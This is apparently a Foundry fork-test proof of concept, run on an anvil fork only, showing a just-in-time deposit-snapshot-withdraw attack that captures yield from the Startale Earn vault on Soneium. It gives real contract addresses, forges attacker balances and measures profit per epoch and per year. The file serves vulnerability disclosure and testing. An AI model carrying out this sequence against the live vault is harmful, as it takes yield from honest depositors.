// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {Vm} from "forge-std/Vm.sol";
import {IERC20, IEarnVault, IRewardRedistributor} from "../src/IStartale.sol";

/// @title ZH4-02 Startale Earn (Soneium) — Play-P JIT yield capture, fork PoC
/// @notice Read-only against Soneium: everything runs on an anvil fork. No mainnet txs.
///         Sequence per epoch: deposit X one block before the keeper snapshot, keeper
///         snapshotVaultTVLs(), keeper distribute() next block, attacker withdraw next block.
contract StartaleJITTest is Test {
    address constant VAULT = 0xFdeB7e9F59cad080D9158ff850Ce79bCf6cdd5f0;
    address constant RR = 0xda798684ffD5eb509c2Ab7b8352EC55B31F18201;
    address constant USDSC = 0x3f99231dD03a9F0E7e3421c92B7b90fbe012985a;
    address constant KEEPER = 0x86bE13a26d548FA5407Ee3E5a8321B4E1019333C;

    // M0 MYieldToOne ERC-7201 storage: totalSupply, yieldRecipient, balanceOf mapping.
    uint256 constant USDSC_STORE_BASE =
        0xee2f6fc7e2e5879b17985791e0d12536cba689bda43c77b8911497248f4af100;
    uint256 constant USDSC_BAL_MAPPING_SLOT = USDSC_STORE_BASE + 2;

    address attacker = address(0xA77ACCE5);

    uint256 forkBlock;
    uint256 forkTimestamp;
    string rpcUrl;

    // Live fork used for the headline state read (2026-10-17 23:48:43 UTC).
    uint256 constant PIN_SMALL_EPOCH = 29_573_086;
    // Fork just before the 2026-10-17 21:00:05 UTC snapshot (large-yield epoch).
    uint256 constant PIN_LARGE_EPOCH = 29_568_020;

    event Distributed(
        uint256 minted,
        uint256 feeToStartale,
        uint256 toEarnVault,
        uint256 toSUSDSCVault,
        uint256 toStartaleExtra,
        uint256 S_base,
        uint256 T_earn,
        uint256 T_yield
    );

    function setUp() public {
        rpcUrl = vm.envOr("SONEIUM_RPC_URL", string("https://rpc.soneium.org"));
        uint256 pin = vm.envOr("SONEIUM_FORK_BLOCK", PIN_SMALL_EPOCH);
        vm.createSelectFork(rpcUrl, pin);
        forkBlock = block.number;
        forkTimestamp = block.timestamp;
    }

    function _selectFork(uint256 pin) internal {
        vm.createSelectFork(rpcUrl, pin);
        forkBlock = block.number;
        forkTimestamp = block.timestamp;
    }

    /// @dev next scheduled snapshot time (HH:00:05 every 3h), after fork timestamp
    function _nextSnapshotTs() internal view returns (uint256) {
        uint256 last = IRewardRedistributor(RR).lastSnapshotTimestamp();
        uint256 t = last + 3 hours;
        while (t <= forkTimestamp) t += 3 hours;
        return t;
    }

    function _forgeBalance(address who, uint256 amount) internal {
        bytes32 slot = keccak256(abi.encode(who, USDSC_BAL_MAPPING_SLOT));
        vm.store(USDSC, slot, bytes32(amount));
    }

    /// @dev Simulates the epoch. If X == 0, that is the no-attacker control.
    function _runEpoch(uint256 X, string memory label) internal returns (uint256 profit, uint256 toEarn, uint256 minted) {
        uint256 extraOut;
        uint256 onOut;
        uint256 snapTs = _nextSnapshotTs();

        // ---- live state at fork ----
        uint256 H = IEarnVault(VAULT).totalPrincipal();
        uint256 vaultBal = IERC20(USDSC).balanceOf(VAULT);
        uint256 S = IERC20(USDSC).totalSupply();
        (
            uint256 couldBeMinted,
            uint256 previewFee,
            uint256 previewToEarn,
            uint256 previewToOn,
            uint256 previewExtra,
            uint256 previewSBase,
            uint256 previewTEarn,
            uint256 previewTYield
        ) = IRewardRedistributor(RR).previewSplitCurrent();

        console.log("== ZH4-02 Startale Earn fork epoch ==");
        console.log(label);
        console.log("fork block", forkBlock);
        console.log("fork timestamp", forkTimestamp);
        console.log("next snapshot ts", snapTs);
        console.log("H totalPrincipal (6dp)", H);
        console.log("vault USDSC balance", vaultBal);
        console.log("USDSC totalSupply", S);
        console.log("pending couldBeMinted", couldBeMinted);
        console.log("preview toEarn", previewToEarn);
        console.log("preview fee", previewFee);
        console.log("preview toOn", previewToOn);
        console.log("preview extra", previewExtra);
        console.log("preview S_base", previewSBase);
        console.log("preview T_earn", previewTEarn);
        console.log("preview T_yield", previewTYield);
        console.log("fee bps", IRewardRedistributor(RR).fee_on_yield_bps());
        console.log("snapshotMaxAge", IRewardRedistributor(RR).snapshotMaxAge());
        console.log("vault paused", IEarnVault(VAULT).paused());
        console.log("rr paused", IRewardRedistributor(RR).paused());
        console.log("version", IEarnVault(VAULT).getVersion());
        console.log("owner", IEarnVault(VAULT).owner());
        console.log("pauser", IEarnVault(VAULT).pauser());
        console.log("attacker blacklisted", IEarnVault(VAULT).isBlacklisted(attacker));

        // ---- attacker capital (forged balance; totalSupply untouched) ----
        uint256 bal0 = IERC20(USDSC).balanceOf(attacker);
        if (X > 0) {
            _forgeBalance(attacker, X);
            vm.prank(attacker);
            IERC20(USDSC).approve(VAULT, type(uint256).max);
        }

        // ---- deposit one block BEFORE the snapshot block ----
        vm.warp(snapTs - 2);
        vm.roll(block.number + 1);
        uint64 depositGas;
        if (X > 0) {
            vm.prank(attacker);
            IEarnVault(VAULT).deposit(X);
            depositGas = vm.lastCallGas().gasTotalUsed;
        }
        uint256 Hafter = IEarnVault(VAULT).totalPrincipal();

        // ---- keeper snapshot at HH:00:05 ----
        vm.warp(snapTs);
        vm.roll(block.number + 1);
        vm.prank(KEEPER);
        IRewardRedistributor(RR).snapshotVaultTVLs();
        uint256 snapEarnTVL = IRewardRedistributor(RR).lastEarnTVL();
        console.log("snapshot T_earn", snapEarnTVL);
        console.log("totalPrincipal after deposit", Hafter);

        // ---- keeper distribute ~4s later (next block) ----
        vm.warp(snapTs + 4);
        vm.roll(block.number + 1);
        uint256 vaultBefore = IERC20(USDSC).balanceOf(VAULT);
        vm.recordLogs();
        vm.prank(KEEPER);
        IRewardRedistributor(RR).distribute();
        Vm.Log[] memory logs = vm.getRecordedLogs();
        toEarn = IERC20(USDSC).balanceOf(VAULT) - vaultBefore;
        for (uint256 i = 0; i < logs.length; i++) {
            if (logs[i].emitter == RR && logs[i].topics[0] == keccak256("Distributed(uint256,uint256,uint256,uint256,uint256,uint256,uint256,uint256)")) {
                (
                    uint256 m,
                    uint256 feeToStartale,
                    uint256 toEarnVault,
                    uint256 toSUSDSCVault,
                    uint256 toStartaleExtra,
                    uint256 sBase,
                    uint256 tEarn,
                    uint256 tYield
                ) = abi.decode(
                    logs[i].data, (uint256, uint256, uint256, uint256, uint256, uint256, uint256, uint256)
                );
                minted = m;
                extraOut = toStartaleExtra;
                onOut = toSUSDSCVault;
                emit Distributed(m, feeToStartale, toEarnVault, toSUSDSCVault, toStartaleExtra, sBase, tEarn, tYield);
            }
        }
        uint256 claimableAfter = IEarnVault(VAULT).claimable(attacker);
        console.log("minted this epoch", minted);
        console.log("toEarnVault", toEarn);
        console.log("toStartaleExtra", extraOut);
        console.log("toSUSDSCVault", onOut);
        console.log("honest depositor share of toEarn", toEarn * H / Hafter);
        console.log("attacker claimable", claimableAfter);

        // ---- exit in the next block ----
        vm.roll(block.number + 1);
        uint64 withdrawGas;
        if (X > 0) {
            vm.prank(attacker);
            IEarnVault(VAULT).withdraw(X);
            withdrawGas = vm.lastCallGas().gasTotalUsed;
        }
        uint256 balEnd = IERC20(USDSC).balanceOf(attacker);
        // X was forged into the attacker's balance (capital assumed acquired at par and
        // returned on exit), so profit is the post-withdraw balance minus that principal.
        profit = balEnd > X ? balEnd - X : 0;

        console.log("attacker final balance", balEnd);
        console.log("attacker profit (6dp)", profit);
        console.log("deposit gas", depositGas);
        console.log("withdraw gas", withdrawGas);
        console.log("H+X after exit", IEarnVault(VAULT).totalPrincipal());
        console.log("honest-only counterfactual toEarn = minted*997/10000*H/S");
        console.log("capture per $1M per epoch (6dp)", (minted * 9970 / 10000) * 1_000_000e6 / (S - minted));
    }

    function test_P0_live_state_and_controls() public {
        _runEpoch(0, "P0 control: no attacker, real keeper epoch");
    }

    function test_P1_playP_1M() public {
        (uint256 profit, uint256 toEarn, uint256 minted) = _runEpoch(1_000_000e6, "P1: Play P $1,000,000");
        console.log("RESULT_P1_PROFIT", profit);
        assertGt(toEarn, 0, "no yield distributed (M index stale at fork block?)");
        assertGt(profit, 0, "attacker captured nothing");
        assertGt(minted, 0, "minted==0");
    }

    function test_P2_playP_3_5M_float_bound() public {
        (uint256 profit, uint256 toEarn, uint256 minted) = _runEpoch(3_500_000e6, "P2: Play P $3,500,000 (float bound)");
        console.log("RESULT_P2_PROFIT", profit);
        assertGt(toEarn, 0, "no yield distributed");
        assertGt(profit, 0, "attacker captured nothing");
        assertGt(minted, 0, "minted==0");
    }

    function test_P1L_playP_1M_large_epoch() public {
        _selectFork(PIN_LARGE_EPOCH);
        (uint256 profit, uint256 toEarn, uint256 minted) = _runEpoch(1_000_000e6, "P1L: Play P $1,000,000 (large epoch)");
        console.log("RESULT_P1L_PROFIT", profit);
        assertGt(toEarn, 0, "no yield distributed");
        assertGt(profit, 0, "attacker captured nothing");
        assertGt(minted, 0, "minted==0");
    }

    function test_P2L_playP_3_5M_large_epoch() public {
        _selectFork(PIN_LARGE_EPOCH);
        (uint256 profit, uint256 toEarn, uint256 minted) = _runEpoch(3_500_000e6, "P2L: Play P $3,500,000 (large epoch)");
        console.log("RESULT_P2L_PROFIT", profit);
        assertGt(toEarn, 0, "no yield distributed");
        assertGt(profit, 0, "attacker captured nothing");
        assertGt(minted, 0, "minted==0");
    }

    /// @dev Full-day run-rate: 4 small + 4 large epochs per day, measured on the two
    ///      live forks immediately around the 2026-10-17 21:00 UTC boundary.
    function test_P4_two_epoch_daily_average() public {
        _selectFork(PIN_SMALL_EPOCH);
        (uint256 small1M,,) = _runEpoch(1_000_000e6, "P4a: small epoch $1M");
        _selectFork(PIN_SMALL_EPOCH);
        (uint256 small35M,,) = _runEpoch(3_500_000e6, "P4b: small epoch $3.5M");
        _selectFork(PIN_LARGE_EPOCH);
        (uint256 large1M,,) = _runEpoch(1_000_000e6, "P4c: large epoch $1M");
        _selectFork(PIN_LARGE_EPOCH);
        (uint256 large35M,,) = _runEpoch(3_500_000e6, "P4d: large epoch $3.5M");

        uint256 daily1M = (small1M + large1M) / 2 * 8;
        uint256 daily35M = (small35M + large35M) / 2 * 8;
        console.log("RESULT_DAILY_1M", daily1M);
        console.log("RESULT_DAILY_3_5M", daily35M);
        console.log("RESULT_ANNUAL_1M", daily1M * 365);
        console.log("RESULT_ANNUAL_3_5M", daily35M * 365);
        assertGt(daily1M, 0, "no daily capture");
    }

    /// @dev No lock / no fee / no minimum: deposit and withdraw in the same block.
    function test_P3_no_lock_no_fee() public {
        uint256 X = 1_000e6;
        _forgeBalance(attacker, X);
        vm.startPrank(attacker);
        IERC20(USDSC).approve(VAULT, X);
        IEarnVault(VAULT).deposit(X);
        IEarnVault(VAULT).withdraw(X);
        vm.stopPrank();
        assertEq(IERC20(USDSC).balanceOf(attacker), X, "principal not returned 1:1");
        console.log("P3 same-block roundtrip returned exactly", IERC20(USDSC).balanceOf(attacker));
    }
}
